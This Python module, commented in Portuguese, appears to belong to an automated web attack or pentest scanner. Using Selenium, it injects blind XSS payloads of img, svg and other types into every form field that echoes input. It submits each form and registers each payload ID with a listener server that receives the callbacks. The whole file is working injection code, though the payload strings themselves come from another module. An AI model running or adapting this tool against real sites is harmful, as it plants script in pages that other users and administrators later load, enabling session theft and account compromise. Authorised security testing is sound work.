from ..http_server import registrar_payload_injetado
from .field_tester import eco_test, activate_mat_input_field, find_field_element, submit_form, return_to_original_page
from .payload_builder import build_payloads, get_payload_types
from ...recon.web_crawler import get_rendered_html, find_tags, complete_session_reset
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time

# Configurações padrão
TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

def blind_xss_injection(campos_validos, driver, url_ouvinte):
    """Injeta payloads blind XSS - estratégia 'disparar e esquecer'"""
    
    # Salva a URL original para voltar depois de cada injeção
    original_url = driver.current_url
    injected_payloads = []
    
    try:
        for campo in campos_validos:
            # Usa diretamente os campos que já foram validados pelo eco_test
            element = campo['element']
            field_name = element.get('name') or element.get('id')
            field_id = element.get('id')
            
            # Os campos já foram validados pelo eco_test, não precisa verificar tipo
            payload_types = get_payload_types()
            
            for payload_type in payload_types:  # Um payload de cada tipo por campo
                try:
                    # Registra o payload e obtém ID único
                    payload_id = registrar_payload_injetado(
                        campo_id=field_id,
                        campo_name=field_name,
                        payload=f"payload_{payload_type}",
                        url_origem=original_url
                    )
                    
                    # Cria payload com ID específico
                    payloads = build_payloads(url_ouvinte, payload_id)
                    payload = payloads[0] if payload_type == 'img' else \
                             payloads[1] if payload_type == 'svg' else payloads[2]
                    
                    # Tratamento especial para mat-input-1
                    if element.get('id') == 'mat-input-1':
                        input_field = activate_mat_input_field(driver, 'mat-input-1')
                        if not input_field:
                            print(f"Campo de busca mat-input-1 não pode ser ativado")
                            continue
                    else:
                        # Para outros campos, usa a lógica do field_tester
                        input_field = find_field_element(driver, element)
                    
                    # Verifica se conseguiu encontrar/ativar o campo
                    if not input_field:
                        print(f"Não foi possível encontrar o campo {field_name}")
                        continue
                    
                    # Injeção do payload blind XSS
                    input_field.clear()
                    input_field.send_keys(payload)
                    
                    # Submete o formulário
                    submit_form(driver, input_field)
                    
                    # Aguarda um pouco para a página processar
                    time.sleep(2)
                    
                    injected_payloads.append({
                        'payload_id': payload_id,
                        'payload': payload,
                        'field_name': field_name,
                        'payload_type': payload_type,
                        'status': 'injected'
                    })
                    
                    print(f"Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                    
                    # Volta para a página original se necessário
                    return_to_original_page(driver, original_url)
                    
                except Exception as e:
                    print(f"Falha ao injetar payload no campo {field_name}: {e}")
                    continue

    except Exception as e:
        print(f"An error occurred during blind XSS injection testing: {e}")
        return []

    return injected_payloads

